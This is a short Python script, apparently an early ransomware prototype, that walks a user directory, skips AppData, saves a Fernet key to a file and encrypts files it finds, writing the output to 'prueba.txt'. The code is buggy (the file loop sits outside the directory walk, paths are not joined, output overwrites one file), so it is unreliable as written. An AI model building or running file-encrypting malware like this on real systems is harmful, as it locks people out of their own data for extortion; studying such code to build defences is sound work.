import os  
from cryptography.fernet import Fernet 
from main import key

home_path =  os.path.expanduser('~')
test_path = 'C:/Users/USUARIO/test_path'
current_user = os.getlogin()
print(home_path)
print(current_user)

def encrypt_path():
 for root, dirs, files in os.walk(test_path):
  if 'AppData' in dirs:
        dirs.remove('AppData') 
 for x in files:
  print(x)
  with open("KEY", "wb") as file_key :#create binary key to encrypt (and decrypt)
   file_key.write(key)
   loaded_key = Fernet(key)
  with open(x, "rb") as f:
    original_data = f.read()

  #encrypt data, fernet is gonna to encrypt the content in the variable "original_data" using the loaded ke
  encrypted_data = loaded_key.encrypt(original_data)

  #save encrypted file
  with open("prueba.txt", "wb") as f_encrypted:
    f_encrypted.write(encrypted_data)
     
  
encrypt_path()
